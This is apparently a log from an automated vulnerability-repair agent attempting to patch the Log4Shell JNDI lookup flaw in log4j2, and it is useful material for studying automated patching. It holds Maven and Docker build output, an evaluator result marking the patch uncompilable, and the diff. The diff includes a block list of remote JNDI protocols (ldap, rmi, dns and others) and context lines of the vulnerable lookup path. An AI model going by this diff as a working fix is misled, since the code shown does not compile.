[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m COMPILATION ERROR : [0m                                                         [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                             [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLook[0m [2m               [0m
[2;36m                    [0m         [95mup.java[0m[39m:[0m[1;39m[[0m[1;36m134[0m[39m,[0m[1;36m9[0m[1;39m][0m[39m cannot assign a value to final variable ENABLE_JNDI[0m                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m[1;36m1[0m[39m error[0m                                                                       [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Reactor Summary for Apache Log4j [0m[1;36m2[0m[39m [0m[1;36m2.0[0m[39m-beta9-SNAPSHOT:[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j [0m[1;36m2[0m[39m [0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[39m. SUCCESS [0m[1;39m[[0m[39m  [0m[1;36m7.456[0m[39m s[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j API [0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[39m.. SUCCESS [0m[1;39m[[0m[39m  [0m[1;36m8.891[0m[39m s[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j Core [0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[39m. FAILURE [0m[1;39m[[0m[39m  [0m[1;36m5.073[0m[39m s[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m BUILD FAILURE[0m                                                                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Total time:  [0m[1;36m27.634[0m[39m s[0m                                                         [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Finished at: [0m[1;36m2026[0m[39m-[0m[1;36m01[0m[39m-06T[0m[1;92m17:14:56[0m[39mZ[0m                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m Failed to execute goal [0m                                                      [2m               [0m
[2;36m                    [0m         [39morg.apache.maven.plugins:maven-compiler-plugin:[0m[1;36m3.1[0m[39m:compile [0m[1;39m([0m[39mdefault-compile[0m[1;39m)[0m[39m on [0m     [2m               [0m
[2;36m                    [0m         [39mproject log4j-core: Compilation failure[0m                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                             [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLook[0m [2m               [0m
[2;36m                    [0m         [95mup.java[0m[39m:[0m[1;39m[[0m[1;36m134[0m[39m,[0m[1;36m9[0m[1;39m][0m[39m cannot assign a value to final variable ENABLE_JNDI[0m                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m -> [0m[1;39m[[0m[39mHelp [0m[1;36m1[0m[1;39m][0m                                                                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m To see the full stack trace of the errors, re-run Maven with the -e switch.[0m  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m Re-run Maven using the -X switch to enable full debug logging.[0m               [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m For more information about the errors and possible solutions, please read [0m   [2m               [0m
[2;36m                    [0m         [39mthe following articles:[0m                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m[1;39m[[0m[39mHelp [0m[1;36m1[0m[1;39m][0m[39m [0m                                                                    [2m               [0m
[2;36m                    [0m         [4;94mhttp://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m                [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m After correcting the problems, you can resume the build with the command[0m     [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m   mvn <args[0m[1m>[0m -rf :log4j-core                                                 [2m               [0m
[2;36m                    [0m         subprocess command returned a non-zero exit status: [1;36m1[0m                                [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [35m/home/qqor/crete/reports/prism.prism_claude_sonnet_4_5/log4j2_log4j2-delta-01_vuln_0[0m ]8;id=836556;file:///home/qqor/crete/packages/crete/framework/agent/functions.py\[2mfunctions.py[0m]8;;\[2m:[0m]8;id=252177;file:///home/qqor/crete/packages/crete/framework/agent/functions.py#17\[2m17[0m]8;;\
[2;36m                    [0m         [35m/agent-output-1767719165.307853/[0m[95mbuild_failed_stderr.txt[0m: INFO:__main__:Running:      [2m               [0m
[2;36m                    [0m         docker build -t aixcc-afc/log4j2:latest --file                                       [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/projects/log4j2/[0m[95mDockerfile[0m       [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/projects/[0m[95mlog4j2.[0m                 [2m               [0m
[2;36m                    [0m         #[1;36m0[0m building with [32m"default"[0m instance using docker driver                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m1[0m [1m[[0minternal[1m][0m load build definition from Dockerfile                                  [2m               [0m
[2;36m                    [0m         #[1;36m1[0m transferring dockerfile: [1;36m1.[0m23kB done                                              [2m               [0m
[2;36m                    [0m         #[1;36m1[0m DONE [1;36m0.[0m0s                                                                         [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m2[0m [1m[[0minternal[1m][0m load metadata for ghcr.io/aixcc-finals/base-builder-jvm:v1.[1;36m3.0[0m         [2m               [0m
[2;36m                    [0m         #[1;36m2[0m DONE [1;36m0.[0m0s                                                                         [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m3[0m [1m[[0minternal[1m][0m load .dockerignore                                                     [2m               [0m
[2;36m                    [0m         #[1;36m3[0m transferring context: 2B done                                                     [2m               [0m
[2;36m                    [0m         #[1;36m3[0m DONE [1;36m0.[0m0s                                                                         [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m4[0m [1m[[0m[1;36m1[0m/[1;36m9[0m[1m][0m FROM ghcr.io/aixcc-finals/base-builder-jvm:v1.[1;36m3.0[0m                           [2m               [0m
[2;36m                    [0m         #[1;36m4[0m DONE [1;36m0.[0m0s                                                                         [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m5[0m [1m[[0minternal[1m][0m load build context                                                     [2m               [0m
[2;36m                    [0m         #[1;36m5[0m transferring context: 760B done                                                   [2m               [0m
[2;36m                    [0m         #[1;36m5[0m DONE [1;36m0.[0m0s                                                                         [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m6[0m [1m[[0m[1;36m6[0m/[1;36m9[0m[1m][0m RUN tar -zxf [35m/src/[0m[95mlogging-log4j2.tar.gz[0m -C [35m/[0m[95msrc[0m && rm                       [2m               [0m
[2;36m                    [0m         [35m/src/[0m[95mlogging-log4j2.tar.gz[0m                                                           [2m               [0m
[2;36m                    [0m         #[1;36m6[0m CACHED                                                                            [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m7[0m [1m[[0m[1;36m8[0m/[1;36m9[0m[1m][0m COPY build.sh *.options [35m/src/[0m                                               [2m               [0m
[2;36m                    [0m         #[1;36m7[0m CACHED                                                                            [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m8[0m [1m[[0m[1;36m3[0m/[1;36m9[0m[1m][0m RUN unzip maven.zip -d [32m"/src/maven-3.6.3"[0m && rm -rf maven.zip               [2m               [0m
[2;36m                    [0m         #[1;36m8[0m CACHED                                                                            [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m9[0m [1m[[0m[1;36m2[0m/[1;36m9[0m[1m][0m COPY pkgs/maven.zip [35m/src/[0m                                                   [2m               [0m
[2;36m                    [0m         #[1;36m9[0m CACHED                                                                            [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m10[0m [1m[[0m[1;36m4[0m/[1;36m9[0m[1m][0m COPY fuzz-targets [35m/src/[0m[95mfuzz-targets[0m                                        [2m               [0m
[2;36m                    [0m         #[1;36m10[0m CACHED                                                                           [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m11[0m [1m[[0m[1;36m7[0m/[1;36m9[0m[1m][0m ADD pkgs/OpenJDK8U-jdk_x64_linux_hotspot_8u432b06.tar.gz [35m/src/[0m             [2m               [0m
[2;36m                    [0m         #[1;36m11[0m CACHED                                                                           [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m12[0m [1m[[0m[1;36m5[0m/[1;36m9[0m[1m][0m COPY pkgs/logging-log4j2.tar.gz [35m/src/[0m[95mlogging-log4j2.tar.gz[0m                 [2m               [0m
[2;36m                    [0m         #[1;36m12[0m CACHED                                                                           [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m13[0m [1m[[0m[1;36m9[0m/[1;36m9[0m[1m][0m WORKDIR [35m/src/[0m[95mlogging-log4j2[0m                                                [2m               [0m
[2;36m                    [0m         #[1;36m13[0m CACHED                                                                           [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         #[1;36m14[0m exporting to image                                                               [2m               [0m
[2;36m                    [0m         #[1;36m14[0m exporting layers done                                                            [2m               [0m
[2;36m                    [0m         #[1;36m14[0m writing image                                                                    [2m               [0m
[2;36m                    [0m         sh[1;92ma256:04d4[0m3547995b11d0687eb41a4972aa56766452654a71ae99b47d59d706c9806a done         [2m               [0m
[2;36m                    [0m         #[1;36m14[0m naming to docker.io/aixcc-afc/log4j2:latest                                      [2m               [0m
[2;36m                    [0m         #[1;36m14[0m naming to docker.io/aixcc-afc/log4j2:latest done                                 [2m               [0m
[2;36m                    [0m         #[1;36m14[0m DONE [1;36m0.[0m0s                                                                        [2m               [0m
[2;36m                    [0m         INFO:__main__:Keeping existing build artifacts as-is [1m([0mif any[1m)[0m.                       [2m               [0m
[2;36m                    [0m         INFO:__main__:Running: docker run --privileged --shm-[33msize[0m=[35m2g[0m --platform linux/amd64  [2m               [0m
[2;36m                    [0m         --rm -i -e [33mFUZZING_ENGINE[0m=[35mlibfuzzer[0m -e [33mSANITIZER[0m=[35maddress[0m -e [33mARCHITECTURE[0m=[35mx86_64[0m -e   [2m               [0m
[2;36m                    [0m         [33mPROJECT_NAME[0m=[35mlog4j2[0m -e [33mHELPER[0m=[3;92mTrue[0m -e [33mFUZZING_LANGUAGE[0m=[35mjvm[0m -e [33mBASH_ENV[0m=[35m/work/[0m[95mbashrc0[0m [2m               [0m
[2;36m                    [0m         -e [33mMAVEN_OPTS[0m=-Dmaven.repo.[33mlocal[0m=[35m/work/[0m[95mmavencache[0m -v                                 [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/.cache/[0m[95mofficial-afc-logging-log4j2[0m:[35m/[0m[95mlocal-source-mount[0m:ro -v        [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/build/out/log4j2/[0m:[35m/[0m[95mout[0m -v        [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/build/work/[0m[95mlog4j2[0m:[35m/[0m[95mwork[0m -t       [2m               [0m
[2;36m                    [0m         aixcc-afc/log4j2:latest [35m/bin/[0m[95mbash[0m -c [32m'pushd $SRC && rm -rf /src/logging-log4j2 && cp[0m [2m               [0m
[2;36m                    [0m         [32m-r /local-source-mount /src/logging-log4j2 && popd && compile'[0m.                      [2m               [0m
[2;36m                    [0m         ERROR:__main__:Building fuzzers failed.                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Patching[1m)[0m Took [1;36m35.04[0m seconds; [33mexception[0m=[3;91mFalse[0m    ]8;id=184239;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=661506;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=457590;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=25053;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:14:58][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.85[0m seconds;                ]8;id=439245;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=979823;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=631559;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=848726;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:14:59][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.85[0m seconds;                ]8;id=461712;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=383760;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m ===Evaluator [33mResult[0m===                                                              ]8;id=145329;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py\[2mevaluator.py[0m]8;;\[2m:[0m]8;id=794192;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py#204\[2m204[0m]8;;\
[2;36m                    [0m         PatchStatus.UNCOMPILABLE                                                            [2m                [0m
[2;36m                    [0m         ===Evaluator [33mDiff[0m===                                                                [2m                [0m
[2;36m                    [0m         --- a/core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java       [2m                [0m
[2;36m                    [0m         +++ b/core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java       [2m                [0m
[2;36m                    [0m         @@ [1;36m-19[0m,[1;36m8[0m +[1;36m19[0m,[1;36m11[0m @@                                                                  [2m                [0m
[2;36m                    [0m          import javax.naming.InitialContext;                                                [2m                [0m
[2;36m                    [0m          import javax.naming.NamingException;                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.Logger;                                            [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.LogEvent;                                     [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.config.plugins.Plugin;                        [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.status.StatusLogger;                               [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.util.PropertiesUtil;                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m          [35m/[0m**                                                                                [2m                [0m
[2;36m                    [0m           * Looks up keys from JNDI resources.                                              [2m                [0m
[2;36m                    [0m         @@ [1;36m-28[0m,[1;36m7[0m +[1;36m31[0m,[1;36m15[0m @@                                                                  [2m                [0m
[2;36m                    [0m          @[1;35mPlugin[0m[1m([0mname = [32m"jndi"[0m, category = [32m"Lookup"[0m[1m)[0m                                        [2m                [0m
[2;36m                    [0m          public class JndiLookup implements StrLookup [1m{[0m                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         -    private static boolean ENABLE_JNDI = true;                                     [2m                [0m
[2;36m                    [0m         +    private static final Logger LOGGER = [1;35mStatusLogger.getLogger[0m[1m([0m[1m)[0m;                 [2m                [0m
[2;36m                    [0m         +    private static final boolean ENABLE_JNDI;                                      [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    static [1m{[0m                                                                       [2m                [0m
[2;36m                    [0m         +        ENABLE_JNDI =                                                              [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getBooleanProperty[0m[1m([0m[32m"log4j2.enableJndiLookup"[0m,        [2m                [0m
[2;36m                    [0m         false[1m)[0m;                                                                             [2m                [0m
[2;36m                    [0m         +        if [1m([0mENABLE_JNDI[1m)[0m [1m{[0m                                                         [2m                [0m
[2;36m                    [0m         +            [1;35mLOGGER.warn[0m[1m([0m[32m"JNDI lookup is enabled. This can pose a security risk. [0m   [2m                [0m
[2;36m                    [0m         [32mSet log4j2.[0m[32menableJndiLookup[0m[32m=[0m[32mfalse[0m[32m to disable."[0m[1m)[0m;                                    [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +    [1m}[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m** JNDI resourcce path prefix used in a J2EE container *[35m/[0m                     [2m                [0m
[2;36m                    [0m              static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [32m"java:comp/env/"[0m;    [2m                [0m
[2;36m                    [0m         @@ [1;36m-55[0m,[1;36m6[0m +[1;36m66[0m,[1;36m11[0m @@                                                                  [2m                [0m
[2;36m                    [0m                      return null;                                                           [2m                [0m
[2;36m                    [0m                  [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         +        if [1m([0m![1;35misAllowedJndiProtocol[0m[1m([0mkey[1m)[0m[1m)[0m [1m{[0m                                         [2m                [0m
[2;36m                    [0m         +            [1;35mLOGGER.warn[0m[1m([0m[32m"Rejected JNDI lookup with potentially unsafe protocol: [0m   [2m                [0m
[2;36m                    [0m         [32m{[0m[32m}[0m[32m"[0m, key[1m)[0m;                                                                          [2m                [0m
[2;36m                    [0m         +            return null;                                                           [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m                  try [1m{[0m                                                                      [2m                [0m
[2;36m                    [0m                      InitialContext ctx = new [1;35mInitialContext[0m[1m([0m[1m)[0m;                             [2m                [0m
[2;36m                    [0m                      return [1m([0mString[1m)[0m [1;35mctx.lookup[0m[1m([0m[1;35mconvertJndiName[0m[1m([0mkey[1m)[0m[1m)[0m;                      [2m                [0m
[2;36m                    [0m         @@ [1;36m-64[0m,[1;36m9[0m +[1;36m80[0m,[1;36m45[0m @@                                                                  [2m                [0m
[2;36m                    [0m              [1m}[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         +     * Validates that the JNDI name uses only allowed protocols [1m([0mlocal java:       [2m                [0m
[2;36m                    [0m         scheme[1m)[0m.                                                                            [2m                [0m
[2;36m                    [0m         +     * Rejects remote protocols like ldap:[35m/[0m[35m/[0m, ldaps:[35m/[0m[35m/[0m, rmi:[35m/[0m[35m/[0m, dns:[35m/[0m[35m/[0m, iiop:[35m/[0m[35m/[0m,   [2m                [0m
[2;36m                    [0m         corba:[35m/[0m[35m/[0m[95m.[0m                                                                           [2m                [0m
[2;36m                    [0m         +     *                                                                             [2m                [0m
[2;36m                    [0m         +     * @param jndiName The JNDI name to validate                                   [2m                [0m
[2;36m                    [0m         +     * @return true if the protocol is allowed, false otherwise                    [2m                [0m
[2;36m                    [0m         +     *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m         +    private boolean [1;35misAllowedJndiProtocol[0m[1m([0mfinal String jndiName[1m)[0m [1m{[0m                 [2m                [0m
[2;36m                    [0m         +        if [1m([0mjndiName == null[1m)[0m [1m{[0m                                                    [2m                [0m
[2;36m                    [0m         +            return false;                                                          [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        [35m/[0m[35m/[0m Check if the name contains a protocol separator                         [2m                [0m
[2;36m                    [0m         +        final int protoIndex = [1;35mjndiName.indexOf[0m[1m([0m[32m"://"[0m[1m)[0m;                            [2m                [0m
[2;36m                    [0m         +        if [1m([0mprotoIndex > [1;36m0[0m[1m)[0m [1m{[0m                                                      [2m                [0m
[2;36m                    [0m         +            [35m/[0m[35m/[0m Extract the protocol                                                [2m                [0m
[2;36m                    [0m         +            final String protocol = [1;35mjndiName.substring[0m[1m([0m[1;36m0[0m,                          [2m                [0m
[2;36m                    [0m         protoIndex[1m)[0m[1;35m.toLowerCase[0m[1m([0m[1m)[0m;                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +            [35m/[0m[35m/[0m Only allow java: protocol for local JNDI contexts                   [2m                [0m
[2;36m                    [0m         +            if [1m([0m![1;35mprotocol.equals[0m[1m([0m[32m"java"[0m[1m)[0m[1m)[0m [1m{[0m                                        [2m                [0m
[2;36m                    [0m         +                return false;                                                      [2m                [0m
[2;36m                    [0m         +            [1m}[0m                                                                      [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        [35m/[0m[35m/[0m Reject if it starts with known dangerous protocols without :[35m/[0m[35m/[0m          [2m                [0m
[2;36m                    [0m         +        final String lowerName = [1;35mjndiName.toLowerCase[0m[1m([0m[1m)[0m;                           [2m                [0m
[2;36m                    [0m         +        if [1m([0m[1;35mlowerName.startsWith[0m[1m([0m[32m"ldap:"[0m[1m)[0m || [1;35mlowerName.startsWith[0m[1m([0m[32m"ldaps:"[0m[1m)[0m ||     [2m                [0m
[2;36m                    [0m         +            [1;35mlowerName.startsWith[0m[1m([0m[32m"rmi:"[0m[1m)[0m || [1;35mlowerName.startsWith[0m[1m([0m[32m"dns:"[0m[1m)[0m ||        [2m                [0m
[2;36m                    [0m         +            [1;35mlowerName.startsWith[0m[1m([0m[32m"iiop:"[0m[1m)[0m || [1;35mlowerName.startsWith[0m[1m([0m[32m"corba:"[0m[1m)[0m[1m)[0m [1m{[0m     [2m                [0m
[2;36m                    [0m         +            return false;                                                          [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +        return true;                                                               [2m                [0m
[2;36m                    [0m         +    [1m}[0m                                                                              [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m               * Convert the given JNDI name to the actual JNDI name to use.                 [2m                [0m
[2;36m                    [0m               * Default implementation applies the [32m"java:comp/env/"[0m prefix                  [2m                [0m
[2;36m                    [0m               * unless other scheme like [32m"java:"[0m is given.                                  [2m                [0m
[2;36m                    [0m         +     * Only allows local java: contexts for security.                              [2m                [0m
[2;36m                    [0m               * @param jndiName The name of the resource.                                   [2m                [0m
[2;36m                    [0m               * @return The fully qualified name to look up.                                [2m                [0m
[2;36m                    [0m               *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ---                                                                                 [2m                [0m
[2;36m                    [0m         a/core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter. [2m                [0m
[2;36m                    [0m         java                                                                                [2m                [0m
[2;36m                    [0m         +++                                                                                 [2m                [0m
[2;36m                    [0m         b/core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter. [2m                [0m
[2;36m                    [0m         java                                                                                [2m                [0m
[2;36m                    [0m         @@ [1;36m-21[0m,[1;36m16[0m +[1;36m21[0m,[1;36m19[0m @@                                                                 [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.config.plugins.Plugin;                        [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.message.Message;                                   [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.message.MultiformatMessage;                        [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.util.PropertiesUtil;                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m          [35m/[0m**                                                                                [2m                [0m
[2;36m                    [0m           * Returns the event's rendered message in a StringBuilder.                        [2m                [0m
[2;36m                    [0m           *[35m/[0m                                                                                [2m                [0m
[2;36m                    [0m         -@[1;35mPlugin[0m[1m([0mname = [32m"MessagePatternConverter"[0m, category = [32m"Converter"[0m[1m)[0m                  [2m                [0m
[2;36m                    [0m         +@[1;35mPlugin[0m[1m([0mname = [32m"m"[0m, category = [32m"Converter"[0m[1m)[0m                                        [2m                [0m
[2;36m                    [0m          @[1;35mConverterKeys[0m[1m([0m[1m{[0m[32m"m"[0m, [32m"msg"[0m, [32m"message"[0m [1m}[0m[1m)[0m                                           [2m                [0m
[2;36m                    [0m          public final class MessagePatternConverter extends LogEventPatternConverter [1m{[0m      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         +    private static final boolean FORMAT_MESSAGES_NO_LOOKUPS =                      [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getBooleanProperty[0m[1m([0m[32m"log4j2.formatMsgNoLookups"[0m,      [2m                [0m
[2;36m                    [0m         false[1m)[0m;                                                                             [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m              private final String[1m[[0m[1m][0m formats;                                                [2m                [0m
[2;36m                    [0m         -                                                                                   [2m                [0m
[2;36m                    [0m              private final Configuration config;                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         @@ [1;36m-68[0m,[1;36m7[0m +[1;36m71[0m,[1;36m7[0m @@                                                                   [2m                [0m
[2;36m                    [0m                          result = [1;35mmsg.getFormattedMessage[0m[1m([0m[1m)[0m;                                [2m                [0m
[2;36m                    [0m                      [1m}[0m                                                                      [2m                [0m
[2;36m                    [0m                      if [1m([0mresult != null[1m)[0m [1m{[0m                                                  [2m                [0m
[2;36m                    [0m         -                [1;35mtoAppendTo.append[0m[1m([0mconfig != null && [1;35mresult.contains[0m[1m([0m[32m"$[0m[32m{[0m[32m"[0m[1m)[0m ?        [2m                [0m
